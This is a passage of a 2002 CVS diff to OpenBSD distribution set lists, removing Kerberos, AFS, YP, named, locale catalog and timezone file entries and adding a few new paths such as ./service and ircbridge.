+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Time/HiRes/HiRes.a
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Time/HiRes/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Unicode
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Unicode/Normalize
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Unicode/Normalize/Normalize.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Unicode/Normalize/Normalize.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Unicode/Normalize/Normalize.a
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Unicode/Normalize/autosplit.ix
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/XS
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/XS/APItest
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/XS/APItest/APItest.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/XS/APItest/APItest.so
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/XS/Typemap
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/XS/Typemap/Typemap.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/XS/Typemap/Typemap.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Unicode/Normalize/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/attrs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/attrs/attrs.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/attrs/attrs.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/attrs/attrs.a
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/attrs/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/re
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/re/re.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/re/re.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/re/extralibs.ld
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/re/re.a
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/sdbm
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/sdbm/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/threads
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/threads/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/threads/shared
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/threads/shared/shared.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/threads/shared/shared.so
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/threads/threads.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/threads/threads.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/threads/shared/extralibs.ld
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/threads/shared/shared.a
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/threads/threads.a
 ./usr/libdata/perl5/i386-openbsd/5.8.0/encoding.pm
 ./usr/libdata/perl5/i386-openbsd/5.8.0/lib.pm
 ./usr/libdata/perl5/i386-openbsd/5.8.0/ops.pm
@@ -1449,32 +1397,6 @@
 ./usr/libdata/perl5/site_perl/i386-openbsd/kerberosIV/krb_db.ph
 ./usr/libdata/perl5/site_perl/i386-openbsd/kerberosIV/krb_err.ph
 ./usr/libdata/perl5/site_perl/i386-openbsd/kerberosIV/prot.ph
-./usr/libdata/perl5/site_perl/i386-openbsd/kerberosV
-./usr/libdata/perl5/site_perl/i386-openbsd/kerberosV/admin.ph
-./usr/libdata/perl5/site_perl/i386-openbsd/kerberosV/asn1-common.ph
-./usr/libdata/perl5/site_perl/i386-openbsd/kerberosV/asn1_err.ph
-./usr/libdata/perl5/site_perl/i386-openbsd/kerberosV/der.ph
-./usr/libdata/perl5/site_perl/i386-openbsd/kerberosV/gssapi.ph
-./usr/libdata/perl5/site_perl/i386-openbsd/kerberosV/hdb-private.ph
-./usr/libdata/perl5/site_perl/i386-openbsd/kerberosV/hdb-protos.ph
-./usr/libdata/perl5/site_perl/i386-openbsd/kerberosV/hdb.ph
-./usr/libdata/perl5/site_perl/i386-openbsd/kerberosV/hdb_asn1.ph
-./usr/libdata/perl5/site_perl/i386-openbsd/kerberosV/hdb_err.ph
-./usr/libdata/perl5/site_perl/i386-openbsd/kerberosV/heim_err.ph
-./usr/libdata/perl5/site_perl/i386-openbsd/kerberosV/k524_err.ph
-./usr/libdata/perl5/site_perl/i386-openbsd/kerberosV/kadm5
-./usr/libdata/perl5/site_perl/i386-openbsd/kerberosV/kadm5/admin.ph
-./usr/libdata/perl5/site_perl/i386-openbsd/kerberosV/kadm5/kadm5_err.ph
-./usr/libdata/perl5/site_perl/i386-openbsd/kerberosV/kadm5/private.ph
-./usr/libdata/perl5/site_perl/i386-openbsd/kerberosV/kadm5_err.ph
-./usr/libdata/perl5/site_perl/i386-openbsd/kerberosV/kafs.ph
-./usr/libdata/perl5/site_perl/i386-openbsd/kerberosV/krb5-private.ph
-./usr/libdata/perl5/site_perl/i386-openbsd/kerberosV/krb5-protos.ph
-./usr/libdata/perl5/site_perl/i386-openbsd/kerberosV/krb5-types.ph
-./usr/libdata/perl5/site_perl/i386-openbsd/kerberosV/krb5.ph
-./usr/libdata/perl5/site_perl/i386-openbsd/kerberosV/krb5_asn1.ph
-./usr/libdata/perl5/site_perl/i386-openbsd/kerberosV/krb5_err.ph
-./usr/libdata/perl5/site_perl/i386-openbsd/kerberosV/private.ph
 ./usr/libdata/perl5/site_perl/i386-openbsd/keynote.ph
 ./usr/libdata/perl5/site_perl/i386-openbsd/kvm.ph
 ./usr/libdata/perl5/site_perl/i386-openbsd/langinfo.ph
@@ -2104,7 +2026,6 @@
 ./usr/libdata/perl5/site_perl/i386-openbsd/xfs/xfs_vopdefs.ph
 ./usr/libdata/perl5/site_perl/i386-openbsd/zconf.ph
 ./usr/libdata/perl5/site_perl/i386-openbsd/zlib.ph
-./usr/libexec/ld.so
 ./usr/local/libdata/perl5/site_perl/i386-openbsd
 ./usr/mdec/biosboot
 ./usr/mdec/boot
@@ -2119,25 +2040,3 @@
 ./usr/sbin/wsfontload
 ./usr/sbin/wsmoused
 ./usr/sbin/zzz
-./usr/share/misc/pcvtfonts
-./usr/share/misc/pcvtfonts/iso8859-1-euro.816
-./usr/share/misc/pcvtfonts/iso8859-13.808
-./usr/share/misc/pcvtfonts/iso8859-13.810
-./usr/share/misc/pcvtfonts/iso8859-13.814
-./usr/share/misc/pcvtfonts/iso8859-13.816
-./usr/share/misc/pcvtfonts/koi8-r-8x08
-./usr/share/misc/pcvtfonts/koi8-r-8x10
-./usr/share/misc/pcvtfonts/koi8-r-8x14
-./usr/share/misc/pcvtfonts/koi8-r-8x16
-./usr/share/misc/pcvtfonts/koi8-u-8x08
-./usr/share/misc/pcvtfonts/koi8-u-8x10
-./usr/share/misc/pcvtfonts/koi8-u-8x14
-./usr/share/misc/pcvtfonts/koi8-u-8x16
-./usr/share/misc/pcvtfonts/vt220h.808
-./usr/share/misc/pcvtfonts/vt220h.810
-./usr/share/misc/pcvtfonts/vt220h.814
-./usr/share/misc/pcvtfonts/vt220h.816
-./usr/share/misc/pcvtfonts/vt220l.808
-./usr/share/misc/pcvtfonts/vt220l.810
-./usr/share/misc/pcvtfonts/vt220l.814
-./usr/share/misc/pcvtfonts/vt220l.816
Index: src/distrib/sets/lists/base/mi
===================================================================
RCS file: /cvs/src/distrib/sets/lists/base/mi,v
retrieving revision 1.250
diff -u -r1.250 mi
--- src/distrib/sets/lists/base/mi	18 Dec 2002 06:50:16 -0000	1.250
+++ src/distrib/sets/lists/base/mi	20 Dec 2002 23:24:41 -0000
@@ -45,7 +45,6 @@
 ./dev
 ./dev/MAKEDEV
 ./etc
-./etc/afs
 ./etc/amd
 ./etc/disklabels
 ./etc/isakmpd
@@ -53,7 +52,6 @@
 ./etc/isakmpd/certs
 ./etc/isakmpd/keynote
 ./etc/isakmpd/private
-./etc/kerberosIV
 ./etc/mail
 ./etc/mtree
 ./etc/ppp
@@ -146,6 +144,7 @@
 ./sbin/ttyflags
 ./sbin/tunefs
 ./sbin/umount
+./service
 ./stand
 ./tmp
 ./usr
@@ -154,11 +153,9 @@
 ./usr/bin/a2p
 ./usr/bin/addftinfo
 ./usr/bin/afmtodit
-./usr/bin/afslog
 ./usr/bin/apply
 ./usr/bin/apropos
 ./usr/bin/arch
-./usr/bin/asn1_compile
 ./usr/bin/at
 ./usr/bin/atq
 ./usr/bin/atrm
@@ -272,12 +269,8 @@
 ./usr/bin/ipcs
 ./usr/bin/join
 ./usr/bin/jot
-./usr/bin/kauth
-./usr/bin/kdestroy
 ./usr/bin/kdump
 ./usr/bin/keynote
-./usr/bin/kinit
-./usr/bin/klist
 ./usr/bin/ktrace
 ./usr/bin/lam
 ./usr/bin/last
@@ -338,7 +331,6 @@
 ./usr/bin/otp-sha1
 ./usr/bin/page
 ./usr/bin/pagesize
-./usr/bin/pagsh
 ./usr/bin/passwd
 ./usr/bin/paste
 ./usr/bin/patch
@@ -418,7 +410,6 @@
 ./usr/bin/ssh-agent
 ./usr/bin/ssh-keygen
 ./usr/bin/ssh-keyscan
-./usr/bin/string2key
 ./usr/bin/strings
 ./usr/bin/su
 ./usr/bin/sudo
@@ -464,7 +455,6 @@
 ./usr/bin/uudecode
 ./usr/bin/uuencode
 ./usr/bin/vacation
-./usr/bin/verify_krb5_conf
 ./usr/bin/vgrind
 ./usr/bin/vi
 ./usr/bin/view
@@ -486,9 +476,6 @@
 ./usr/bin/xargs
 ./usr/bin/xsubpp
 ./usr/bin/yes
-./usr/bin/ypcat
-./usr/bin/ypmatch
-./usr/bin/ypwhich
 ./usr/bin/yyfix
 ./usr/bin/zcat
 ./usr/bin/zcmp
@@ -1416,15 +1403,10 @@
 ./usr/libdata/ssh
 ./usr/libdata/ssh/Ssh.bin
 ./usr/libexec
-./usr/libexec/afsd
 ./usr/libexec/auth
 ./usr/libexec/auth/login_activ
 ./usr/libexec/auth/login_chpass
 ./usr/libexec/auth/login_crypto
-./usr/libexec/auth/login_krb4
-./usr/libexec/auth/login_krb4-or-pwd
-./usr/libexec/auth/login_krb5
-./usr/libexec/auth/login_krb5-or-pwd
 ./usr/libexec/auth/login_lchpass
 ./usr/libexec/auth/login_passwd
 ./usr/libexec/auth/login_radius
@@ -1455,17 +1437,8 @@
 ./usr/libexec/ftpd
 ./usr/libexec/getNAME
 ./usr/libexec/getty
-./usr/libexec/hprop
-./usr/libexec/hpropd
 ./usr/libexec/identd
-./usr/libexec/ipropd-master
-./usr/libexec/ipropd-slave
-./usr/libexec/kadmind
-./usr/libexec/kauthd
-./usr/libexec/kdc
-./usr/libexec/kerberos
-./usr/libexec/kpasswdd
-./usr/libexec/kpropd
+./usr/libexec/ircbridge
 ./usr/libexec/locate.bigram
 ./usr/libexec/locate.code
 ./usr/libexec/locate.concatdb
@@ -1478,6 +1451,7 @@
 ./usr/libexec/makekey
 ./usr/libexec/makewhatis
 ./usr/libexec/ntalkd
+./usr/libexec/randshuffle
 ./usr/libexec/rpc.rquotad
 ./usr/libexec/rpc.rstatd
 ./usr/libexec/rpc.rusersd
@@ -1544,7 +1518,6 @@
 ./usr/sbin/bootpef
 ./usr/sbin/bootpgw
 ./usr/sbin/bootptest
-./usr/sbin/bos
 ./usr/sbin/certpatch
 ./usr/sbin/chat
 ./usr/sbin/chgrp
@@ -1557,14 +1530,10 @@
 ./usr/sbin/dev_mkdb
 ./usr/sbin/dhcpd
 ./usr/sbin/dhcrelay
-./usr/sbin/dig
-./usr/sbin/dnsquery
 ./usr/sbin/editmap
 ./usr/sbin/edquota
-./usr/sbin/ext_srvtab
 ./usr/sbin/extattrctl
 ./usr/sbin/faithd
-./usr/sbin/fs
 ./usr/sbin/getencstat
 ./usr/sbin/getextattr
 ./usr/sbin/group
@@ -1576,15 +1545,6 @@
 ./usr/sbin/httpd
 ./usr/sbin/inetd
 ./usr/sbin/iostat
-./usr/sbin/kadmin
-./usr/sbin/kdb_destroy
-./usr/sbin/kdb_edit
-./usr/sbin/kdb_init
-./usr/sbin/kdb_util
-./usr/sbin/kprop
-./usr/sbin/ksrvutil
-./usr/sbin/kstash
-./usr/sbin/ktutil
 ./usr/sbin/kvm_mkdb
 ./usr/sbin/logresolve
 ./usr/sbin/lpc
@@ -1592,21 +1552,14 @@
 ./usr/sbin/lptest
 ./usr/sbin/mailstats
 ./usr/sbin/mailwrapper
-./usr/sbin/makedbm
 ./usr/sbin/makemap
-./usr/sbin/mkalias
 ./usr/sbin/mkhybrid
-./usr/sbin/mknetid
 ./usr/sbin/mopa.out
 ./usr/sbin/mopchk
 ./usr/sbin/mopd
 ./usr/sbin/mopprobe
 ./usr/sbin/moptrace
 ./usr/sbin/mtree
-./usr/sbin/named
-./usr/sbin/named.reload
-./usr/sbin/named.restart
-./usr/sbin/ndc
 ./usr/sbin/ndp
 ./usr/sbin/netgroup_mkdb
 ./usr/sbin/nslookup
@@ -1626,7 +1579,6 @@
 ./usr/sbin/pppstats
 ./usr/sbin/praliases
 ./usr/sbin/pstat
-./usr/sbin/pts
 ./usr/sbin/pwd_mkdb
 ./usr/sbin/quot
 ./usr/sbin/quotaoff
@@ -1636,7 +1588,6 @@
 ./usr/sbin/rdate
 ./usr/sbin/rdconfig
 ./usr/sbin/repquota
-./usr/sbin/revnetgroup
 ./usr/sbin/rip6query
 ./usr/sbin/rmgroup
 ./usr/sbin/rmt
@@ -1646,7 +1597,6 @@
 ./usr/sbin/rpc.bootparamd
 ./usr/sbin/rpc.lockd
 ./usr/sbin/rpc.pcnfsd
-./usr/sbin/rpc.yppasswdd
 ./usr/sbin/rtadvd
 ./usr/sbin/rtsold
 ./usr/sbin/rwhod
@@ -1663,8 +1613,6 @@
 ./usr/sbin/spppcontrol
 ./usr/sbin/spray
 ./usr/sbin/sshd
-./usr/sbin/stdethers
-./usr/sbin/stdhosts
 ./usr/sbin/suexec
 ./usr/sbin/supfilesrv
 ./usr/sbin/supscan
@@ -1689,18 +1637,6 @@
 ./usr/sbin/vipw
 ./usr/sbin/visudo
 ./usr/sbin/vnconfig
-./usr/sbin/vos
-./usr/sbin/ypbind
-./usr/sbin/ypinit
-./usr/sbin/yppoll
-./usr/sbin/yppush
-./usr/sbin/ypserv
-./usr/sbin/ypset
-./usr/sbin/yptest
-./usr/sbin/ypxfr
-./usr/sbin/ypxfr_1perday
-./usr/sbin/ypxfr_1perhour
-./usr/sbin/ypxfr_2perday
 ./usr/sbin/zdump
 ./usr/sbin/zic
 ./usr/share
@@ -2040,7 +1976,6 @@
 ./usr/share/misc/mdoc.template
 ./usr/share/misc/more.help
 ./usr/share/misc/na.phone
-./usr/share/misc/nslookup.help
 ./usr/share/misc/scsi_modes
 ./usr/share/misc/termcap
 ./usr/share/misc/termcap.db
@@ -2068,26 +2003,6 @@
 ./usr/share/mk/bsd.sys.mk
 ./usr/share/mk/sys.mk
 ./usr/share/nls
-./usr/share/nls/C
-./usr/share/nls/C/libc.cat
-./usr/share/nls/Pig
-./usr/share/nls/Pig/libc.cat
-./usr/share/nls/de
-./usr/share/nls/de/libc.cat
-./usr/share/nls/es
-./usr/share/nls/es/libc.cat
-./usr/share/nls/fi
-./usr/share/nls/fi/libc.cat
-./usr/share/nls/fr
-./usr/share/nls/fr/libc.cat
-./usr/share/nls/nl
-./usr/share/nls/nl/libc.cat
-./usr/share/nls/no
-./usr/share/nls/no/libc.cat
-./usr/share/nls/ru
-./usr/share/nls/ru/libc.cat
-./usr/share/nls/sv
-./usr/share/nls/sv/libc.cat
 ./usr/share/pf
 ./usr/share/pf/queue1
 ./usr/share/pf/queue2
@@ -2348,1121 +2263,11 @@
 ./usr/share/vi/catalog/spanish
 ./usr/share/vi/catalog/swedish
 ./usr/share/zoneinfo
-./usr/share/zoneinfo/Africa
-./usr/share/zoneinfo/Africa/Abidjan
-./usr/share/zoneinfo/Africa/Accra
-./usr/share/zoneinfo/Africa/Addis_Ababa
-./usr/share/zoneinfo/Africa/Algiers
-./usr/share/zoneinfo/Africa/Asmera
-./usr/share/zoneinfo/Africa/Bamako
-./usr/share/zoneinfo/Africa/Bangui
-./usr/share/zoneinfo/Africa/Banjul
-./usr/share/zoneinfo/Africa/Bissau
-./usr/share/zoneinfo/Africa/Blantyre
-./usr/share/zoneinfo/Africa/Brazzaville
-./usr/share/zoneinfo/Africa/Bujumbura
-./usr/share/zoneinfo/Africa/Cairo
-./usr/share/zoneinfo/Africa/Casablanca
-./usr/share/zoneinfo/Africa/Ceuta
-./usr/share/zoneinfo/Africa/Conakry
-./usr/share/zoneinfo/Africa/Dakar
-./usr/share/zoneinfo/Africa/Dar_es_Salaam
-./usr/share/zoneinfo/Africa/Djibouti
-./usr/share/zoneinfo/Africa/Douala
-./usr/share/zoneinfo/Africa/El_Aaiun
-./usr/share/zoneinfo/Africa/Freetown
-./usr/share/zoneinfo/Africa/Gaborone
-./usr/share/zoneinfo/Africa/Harare
-./usr/share/zoneinfo/Africa/Johannesburg
-./usr/share/zoneinfo/Africa/Kampala
-./usr/share/zoneinfo/Africa/Khartoum
-./usr/share/zoneinfo/Africa/Kigali
-./usr/share/zoneinfo/Africa/Kinshasa
-./usr/share/zoneinfo/Africa/Lagos
-./usr/share/zoneinfo/Africa/Libreville
-./usr/share/zoneinfo/Africa/Lome
-./usr/share/zoneinfo/Africa/Luanda
-./usr/share/zoneinfo/Africa/Lubumbashi
-./usr/share/zoneinfo/Africa/Lusaka
-./usr/share/zoneinfo/Africa/Malabo
-./usr/share/zoneinfo/Africa/Maputo
-./usr/share/zoneinfo/Africa/Maseru
-./usr/share/zoneinfo/Africa/Mbabane
-./usr/share/zoneinfo/Africa/Mogadishu
-./usr/share/zoneinfo/Africa/Monrovia
-./usr/share/zoneinfo/Africa/Nairobi
-./usr/share/zoneinfo/Africa/Ndjamena
-./usr/share/zoneinfo/Africa/Niamey
-./usr/share/zoneinfo/Africa/Nouakchott
-./usr/share/zoneinfo/Africa/Ouagadougou
-./usr/share/zoneinfo/Africa/Porto-Novo
-./usr/share/zoneinfo/Africa/Sao_Tome
-./usr/share/zoneinfo/Africa/Timbuktu
-./usr/share/zoneinfo/Africa/Tripoli
-./usr/share/zoneinfo/Africa/Tunis
-./usr/share/zoneinfo/Africa/Windhoek
-./usr/share/zoneinfo/America
-./usr/share/zoneinfo/America/Adak
-./usr/share/zoneinfo/America/Anchorage
-./usr/share/zoneinfo/America/Anguilla
-./usr/share/zoneinfo/America/Antigua
-./usr/share/zoneinfo/America/Araguaina
-./usr/share/zoneinfo/America/Aruba
-./usr/share/zoneinfo/America/Asuncion
-./usr/share/zoneinfo/America/Atka
-./usr/share/zoneinfo/America/Barbados
-./usr/share/zoneinfo/America/Belem
-./usr/share/zoneinfo/America/Belize
-./usr/share/zoneinfo/America/Boa_Vista
-./usr/share/zoneinfo/America/Bogota
-./usr/share/zoneinfo/America/Boise
-./usr/share/zoneinfo/America/Buenos_Aires
-./usr/share/zoneinfo/America/Cambridge_Bay
-./usr/share/zoneinfo/America/Cancun
-./usr/share/zoneinfo/America/Caracas
-./usr/share/zoneinfo/America/Catamarca
-./usr/share/zoneinfo/America/Cayenne
-./usr/share/zoneinfo/America/Cayman
-./usr/share/zoneinfo/America/Chicago
-./usr/share/zoneinfo/America/Chihuahua
-./usr/share/zoneinfo/America/Cordoba
-./usr/share/zoneinfo/America/Costa_Rica
-./usr/share/zoneinfo/America/Cuiaba
-./usr/share/zoneinfo/America/Curacao
-./usr/share/zoneinfo/America/Danmarkshavn
-./usr/share/zoneinfo/America/Dawson
-./usr/share/zoneinfo/America/Dawson_Creek
-./usr/share/zoneinfo/America/Denver
-./usr/share/zoneinfo/America/Detroit
-./usr/share/zoneinfo/America/Dominica
-./usr/share/zoneinfo/America/Edmonton
-./usr/share/zoneinfo/America/Eirunepe
-./usr/share/zoneinfo/America/El_Salvador
-./usr/share/zoneinfo/America/Ensenada
-./usr/share/zoneinfo/America/Fort_Wayne
-./usr/share/zoneinfo/America/Fortaleza
-./usr/share/zoneinfo/America/Glace_Bay
-./usr/share/zoneinfo/America/Godthab
-./usr/share/zoneinfo/America/Goose_Bay
-./usr/share/zoneinfo/America/Grand_Turk
-./usr/share/zoneinfo/America/Grenada
-./usr/share/zoneinfo/America/Guadeloupe
-./usr/share/zoneinfo/America/Guatemala
-./usr/share/zoneinfo/America/Guayaquil
-./usr/share/zoneinfo/America/Guyana
-./usr/share/zoneinfo/America/Halifax
-./usr/share/zoneinfo/America/Havana
-./usr/share/zoneinfo/America/Hermosillo
-./usr/share/zoneinfo/America/Indiana
-./usr/share/zoneinfo/America/Indiana/Indianapolis
-./usr/share/zoneinfo/America/Indiana/Knox
-./usr/share/zoneinfo/America/Indiana/Marengo
-./usr/share/zoneinfo/America/Indiana/Vevay
-./usr/share/zoneinfo/America/Indianapolis
-./usr/share/zoneinfo/America/Inuvik
-./usr/share/zoneinfo/America/Iqaluit
-./usr/share/zoneinfo/America/Jamaica
-./usr/share/zoneinfo/America/Jujuy
-./usr/share/zoneinfo/America/Juneau
-./usr/share/zoneinfo/America/Kentucky
-./usr/share/zoneinfo/America/Kentucky/Louisville
-./usr/share/zoneinfo/America/Kentucky/Monticello
-./usr/share/zoneinfo/America/Knox_IN
-./usr/share/zoneinfo/America/La_Paz
-./usr/share/zoneinfo/America/Lima
-./usr/share/zoneinfo/America/Los_Angeles
-./usr/share/zoneinfo/America/Louisville
-./usr/share/zoneinfo/America/Maceio
-./usr/share/zoneinfo/America/Managua
-./usr/share/zoneinfo/America/Manaus
-./usr/share/zoneinfo/America/Martinique
-./usr/share/zoneinfo/America/Mazatlan
-./usr/share/zoneinfo/America/Mendoza
-./usr/share/zoneinfo/America/Menominee
-./usr/share/zoneinfo/America/Merida
-./usr/share/zoneinfo/America/Mexico_City
-./usr/share/zoneinfo/America/Miquelon
-./usr/share/zoneinfo/America/Monterrey
-./usr/share/zoneinfo/America/Montevideo
-./usr/share/zoneinfo/America/Montreal
-./usr/share/zoneinfo/America/Montserrat
-./usr/share/zoneinfo/America/Nassau
-./usr/share/zoneinfo/America/New_York
-./usr/share/zoneinfo/America/Nipigon
-./usr/share/zoneinfo/America/Nome
-./usr/share/zoneinfo/America/Noronha
-./usr/share/zoneinfo/America/North_Dakota
-./usr/share/zoneinfo/America/North_Dakota/Center
-./usr/share/zoneinfo/America/Panama
-./usr/share/zoneinfo/America/Pangnirtung
-./usr/share/zoneinfo/America/Paramaribo
-./usr/share/zoneinfo/America/Phoenix
-./usr/share/zoneinfo/America/Port-au-Prince
-./usr/share/zoneinfo/America/Port_of_Spain
-./usr/share/zoneinfo/America/Porto_Acre
-./usr/share/zoneinfo/America/Porto_Velho
-./usr/share/zoneinfo/America/Puerto_Rico
-./usr/share/zoneinfo/America/Rainy_River
-./usr/share/zoneinfo/America/Rankin_Inlet
-./usr/share/zoneinfo/America/Recife
-./usr/share/zoneinfo/America/Regina
-./usr/share/zoneinfo/America/Rio_Branco
-./usr/share/zoneinfo/America/Rosario
-./usr/share/zoneinfo/America/Santiago
-./usr/share/zoneinfo/America/Santo_Domingo
-./usr/share/zoneinfo/America/Sao_Paulo
-./usr/share/zoneinfo/America/Scoresbysund
-./usr/share/zoneinfo/America/Shiprock
-./usr/share/zoneinfo/America/St_Johns
-./usr/share/zoneinfo/America/St_Kitts
-./usr/share/zoneinfo/America/St_Lucia
-./usr/share/zoneinfo/America/St_Thomas
-./usr/share/zoneinfo/America/St_Vincent
-./usr/share/zoneinfo/America/Swift_Current
-./usr/share/zoneinfo/America/Tegucigalpa
-./usr/share/zoneinfo/America/Thule
-./usr/share/zoneinfo/America/Thunder_Bay
-./usr/share/zoneinfo/America/Tijuana
-./usr/share/zoneinfo/America/Tortola
-./usr/share/zoneinfo/America/Vancouver
-./usr/share/zoneinfo/America/Virgin
-./usr/share/zoneinfo/America/Whitehorse
-./usr/share/zoneinfo/America/Winnipeg
-./usr/share/zoneinfo/America/Yakutat
-./usr/share/zoneinfo/America/Yellowknife
-./usr/share/zoneinfo/Antarctica
-./usr/share/zoneinfo/Antarctica/Casey
-./usr/share/zoneinfo/Antarctica/Davis
-./usr/share/zoneinfo/Antarctica/DumontDUrville
-./usr/share/zoneinfo/Antarctica/Mawson
-./usr/share/zoneinfo/Antarctica/McMurdo
-./usr/share/zoneinfo/Antarctica/Palmer
-./usr/share/zoneinfo/Antarctica/South_Pole
-./usr/share/zoneinfo/Antarctica/Syowa
-./usr/share/zoneinfo/Antarctica/Vostok
-./usr/share/zoneinfo/Arctic
-./usr/share/zoneinfo/Arctic/Longyearbyen
-./usr/share/zoneinfo/Asia
-./usr/share/zoneinfo/Asia/Aden
-./usr/share/zoneinfo/Asia/Almaty
-./usr/share/zoneinfo/Asia/Amman
-./usr/share/zoneinfo/Asia/Anadyr
-./usr/share/zoneinfo/Asia/Aqtau
-./usr/share/zoneinfo/Asia/Aqtobe
-./usr/share/zoneinfo/Asia/Ashgabat
-./usr/share/zoneinfo/Asia/Ashkhabad
-./usr/share/zoneinfo/Asia/Baghdad
-./usr/share/zoneinfo/Asia/Bahrain
-./usr/share/zoneinfo/Asia/Baku
-./usr/share/zoneinfo/Asia/Bangkok
-./usr/share/zoneinfo/Asia/Beirut
-./usr/share/zoneinfo/Asia/Bishkek
-./usr/share/zoneinfo/Asia/Brunei
-./usr/share/zoneinfo/Asia/Calcutta
-./usr/share/zoneinfo/Asia/Choibalsan
-./usr/share/zoneinfo/Asia/Chongqing
-./usr/share/zoneinfo/Asia/Chungking
-./usr/share/zoneinfo/Asia/Colombo
-./usr/share/zoneinfo/Asia/Dacca
-./usr/share/zoneinfo/Asia/Damascus
-./usr/share/zoneinfo/Asia/Dhaka
-./usr/share/zoneinfo/Asia/Dili
-./usr/share/zoneinfo/Asia/Dubai
-./usr/share/zoneinfo/Asia/Dushanbe
-./usr/share/zoneinfo/Asia/Gaza
-./usr/share/zoneinfo/Asia/Harbin
-./usr/share/zoneinfo/Asia/Hong_Kong
-./usr/share/zoneinfo/Asia/Hovd
-./usr/share/zoneinfo/Asia/Irkutsk
-./usr/share/zoneinfo/Asia/Istanbul
-./usr/share/zoneinfo/Asia/Jakarta
-./usr/share/zoneinfo/Asia/Jayapura
-./usr/share/zoneinfo/Asia/Jerusalem
-./usr/share/zoneinfo/Asia/Kabul
-./usr/share/zoneinfo/Asia/Kamchatka
-./usr/share/zoneinfo/Asia/Karachi
-./usr/share/zoneinfo/Asia/Kashgar
-./usr/share/zoneinfo/Asia/Katmandu
-./usr/share/zoneinfo/Asia/Krasnoyarsk
-./usr/share/zoneinfo/Asia/Kuala_Lumpur
-./usr/share/zoneinfo/Asia/Kuching
-./usr/share/zoneinfo/Asia/Kuwait
-./usr/share/zoneinfo/Asia/Macao
-./usr/share/zoneinfo/Asia/Macau
-./usr/share/zoneinfo/Asia/Magadan
-./usr/share/zoneinfo/Asia/Makassar
-./usr/share/zoneinfo/Asia/Manila
-./usr/share/zoneinfo/Asia/Muscat
-./usr/share/zoneinfo/Asia/Nicosia
-./usr/share/zoneinfo/Asia/Novosibirsk
-./usr/share/zoneinfo/Asia/Omsk
-./usr/share/zoneinfo/Asia/Oral
-./usr/share/zoneinfo/Asia/Phnom_Penh
-./usr/share/zoneinfo/Asia/Pontianak
-./usr/share/zoneinfo/Asia/Pyongyang
-./usr/share/zoneinfo/Asia/Qatar
-./usr/share/zoneinfo/Asia/Qyzylorda
-./usr/share/zoneinfo/Asia/Rangoon
-./usr/share/zoneinfo/Asia/Riyadh
-./usr/share/zoneinfo/Asia/Riyadh87
-./usr/share/zoneinfo/Asia/Riyadh88
-./usr/share/zoneinfo/Asia/Riyadh89
-./usr/share/zoneinfo/Asia/Saigon
-./usr/share/zoneinfo/Asia/Sakhalin
-./usr/share/zoneinfo/Asia/Samarkand
-./usr/share/zoneinfo/Asia/Seoul
-./usr/share/zoneinfo/Asia/Shanghai
-./usr/share/zoneinfo/Asia/Singapore
-./usr/share/zoneinfo/Asia/Taipei
-./usr/share/zoneinfo/Asia/Tashkent
-./usr/share/zoneinfo/Asia/Tbilisi
-./usr/share/zoneinfo/Asia/Tehran
-./usr/share/zoneinfo/Asia/Tel_Aviv
-./usr/share/zoneinfo/Asia/Thimbu
-./usr/share/zoneinfo/Asia/Thimphu
-./usr/share/zoneinfo/Asia/Tokyo
-./usr/share/zoneinfo/Asia/Ujung_Pandang
-./usr/share/zoneinfo/Asia/Ulaanbaatar
-./usr/share/zoneinfo/Asia/Ulan_Bator
-./usr/share/zoneinfo/Asia/Urumqi
-./usr/share/zoneinfo/Asia/Vientiane
-./usr/share/zoneinfo/Asia/Vladivostok
-./usr/share/zoneinfo/Asia/Yakutsk
-./usr/share/zoneinfo/Asia/Yekaterinburg
-./usr/share/zoneinfo/Asia/Yerevan
-./usr/share/zoneinfo/Atlantic
-./usr/share/zoneinfo/Atlantic/Azores
-./usr/share/zoneinfo/Atlantic/Bermuda
-./usr/share/zoneinfo/Atlantic/Canary
-./usr/share/zoneinfo/Atlantic/Cape_Verde
-./usr/share/zoneinfo/Atlantic/Faeroe
-./usr/share/zoneinfo/Atlantic/Jan_Mayen
-./usr/share/zoneinfo/Atlantic/Madeira
-./usr/share/zoneinfo/Atlantic/Reykjavik
-./usr/share/zoneinfo/Atlantic/South_Georgia
-./usr/share/zoneinfo/Atlantic/St_Helena
-./usr/share/zoneinfo/Atlantic/Stanley
-./usr/share/zoneinfo/Australia
-./usr/share/zoneinfo/Australia/ACT
-./usr/share/zoneinfo/Australia/Adelaide
